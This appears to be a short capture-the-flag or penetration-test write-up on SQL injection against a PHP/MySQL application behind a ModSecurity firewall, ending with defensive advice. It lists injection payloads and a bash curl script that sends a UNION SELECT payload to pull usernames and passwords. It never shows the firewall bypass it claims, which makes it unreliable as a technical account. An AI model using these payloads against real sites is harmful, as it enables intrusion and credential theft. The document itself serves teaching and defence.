Introduction

This writeup demonstrates an advanced SQL injection attack against a web application protected by a Web Application Firewall (WAF). We'll explore various techniques to bypass WAF filters and successfully exploit the vulnerability.

Reconnaissance

The first step in any penetration test is gathering information about the target. We began by identifying the application's attack surface:

  • Target URL: https://target.com/products?id=1
  • Framework: PHP with MySQL backend
  • WAF: ModSecurity with OWASP CRS

Initial Testing

We started with basic SQL injection payloads to test for vulnerabilities:

GET /products?id=1' OR '1'='1
GET /products?id=1 UNION SELECT NULL--
GET /products?id=1 AND 1=1--

All initial attempts were blocked by the WAF with a 403 Forbidden response.

Vulnerability Discovery

After confirming WAF protection, we needed to identify if the application was actually vulnerable behind the WAF. We tested edge cases and encoding techniques:

Testing Methodology

  1. URL encoding special characters
  2. Double URL encoding
  3. Case variation in SQL keywords
  4. Comment-based obfuscation

Exploitation

After identifying the vulnerability, we crafted our exploitation strategy:

#!/bin/bash
# Automated SQL injection script

TARGET="https://target.com/products"
PAYLOAD="1' UNION SELECT NULL,username,password FROM users--"

curl -X GET "${TARGET}?id=${PAYLOAD}" \
  --user-agent "Mozilla/5.0" \
  -H "X-Forwarded-For: 127.0.0.1"

Conclusion

This challenge demonstrated that WAF protection, while useful, is not a complete solution for preventing SQL injection attacks. Key takeaways:

  • Always use parameterized queries
  • Implement input validation at the application level
  • Don't rely solely on WAF for security
  • Regular security audits are essential
